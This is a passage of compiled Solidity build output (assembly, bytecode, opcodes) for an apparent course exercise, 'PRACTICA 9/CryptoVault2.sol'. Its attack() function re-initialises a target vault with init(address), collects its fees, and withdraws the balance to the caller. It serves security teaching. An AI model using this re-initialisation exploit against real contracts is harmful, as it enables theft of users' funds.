\"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7336:7391  abi.encodeWithSignature(\"init(address)\", address(this)) */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7314:7392  attackedContract.call(abi.encodeWithSignature(\"init(address)\", address(this))) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_17:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_17)\n    tag_19:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7314:7392  attackedContract.call(abi.encodeWithSignature(\"init(address)\", address(this))) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_21)\n        /* \"--CODEGEN--\":14:41   */\n    tag_22:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_21:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7314:7392  attackedContract.call(abi.encodeWithSignature(\"init(address)\", address(this))) */\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7449:7465  attackedContract */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":7449:7470  attackedContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":7471:7511  abi.encodeWithSignature(\"collectFees()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"PRACTICA 9/CryptoVault2.sol\":7471:7511  abi.encodeWithSignature(\"collectFees()\") */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xc879657200000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7471:7511  abi.encodeWithSignature(\"collectFees()\") */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7449:7512  attackedContract.call(abi.encodeWithSignature(\"collectFees()\")) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_23:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_23)\n    tag_25:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7449:7512  attackedContract.call(abi.encodeWithSignature(\"collectFees()\")) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_27)\n        /* \"--CODEGEN--\":14:41   */\n    tag_28:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_27:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7449:7512  attackedContract.call(abi.encodeWithSignature(\"collectFees()\")) */\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7184:7520  function attack() external{\r... */\n      jump\t// out\n\n    auxdata: 0xa264697066735822122078d72d13197af382750082f44ff3e24b4958f690db36dd80f5a1f09bffb2579d64736f6c63430006040033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516104633803806104638339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103cf806100946000396000f3fe60806040526004361061002d5760003560e01c806324600fc3146100395780639e5faafc1461005057610034565b3661003457005b600080fd5b34801561004557600080fd5b5061004e610067565b005b34801561005c57600080fd5b506100656100b0565b005b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100ad573d6000803e3d6000fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1630604051602401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527f19ab453c000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101d557805182526020820191506020810190506020830392506101b2565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610237576040519150601f19603f3d011682016040523d82523d6000602084013e61023c565b606091505b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fc8796572000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061032d578051825260208201915060208101905060208303925061030a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461038f576040519150601f19603f3d011682016040523d82523d6000602084013e610394565b606091505b50505056fea264697066735822122078d72d13197af382750082f44ff3e24b4958f690db36dd80f5a1f09bffb2579d64736f6c63430006040033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x463 CODESIZE SUB DUP1 PUSH2 0x463 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x3CF DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x24600FC3 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x50 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x45 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E PUSH2 0x67 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x65 PUSH2 0xB0 JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xAD JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x19AB453C00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D5 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1B2 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x237 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x23C JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xC879657200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x32D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x30A JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x38F JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x394 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH25 0xD72D13197AF382750082F44FF3E24B4958F690DB36DD80F5A1 CREATE SWAP12 SELFDESTRUCT 0xB2 JUMPI SWAP14 PUSH5 0x736F6C6343 STOP MOD DIV STOP CALLER ",
							"sourceMap": "6925:884:0:-:0;;;7052:122;5:9:-1;2:2;;;27:1;24;17:12;2:2;7052:122:0;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;7052:122:0;;;;;;;;;;;;;;;;7122:11;7103:16;;:30;;;;;;;;;;;;;;;;;;7052:122;6925:884;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "60806040526004361061002d5760003560e01c806324600fc3146100395780639e5faafc1461005057610034565b3661003457005b600080fd5b34801561004557600080fd5b5061004e610067565b005b34801561005c57600080fd5b506100656100b0565b005b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100ad573d6000803e3d6000fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1630604051602401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527f19ab453c000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101d557805182526020820191506020810190506020830392506101b2565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610237576040519150601f19603f3d011682016040523d82523d6000602084013e61023c565b606091505b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fc8796572000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061032d578051825260208201915060208101905060208303925061030a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461038f576040519150601f19603f3d011682016040523d82523d6000602084013e610394565b606091505b50505056fea264697066735822122078d72d13197af382750082f44ff3e24b4958f690db36dd80f5a1f09bffb2579d64736f6c63430006040033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x24600FC3 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x50 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x45 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E PUSH2 0x67 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x65 PUSH2 0xB0 JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xAD JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x19AB453C00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D5 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1B2 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x237 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x23C JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xC879657200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 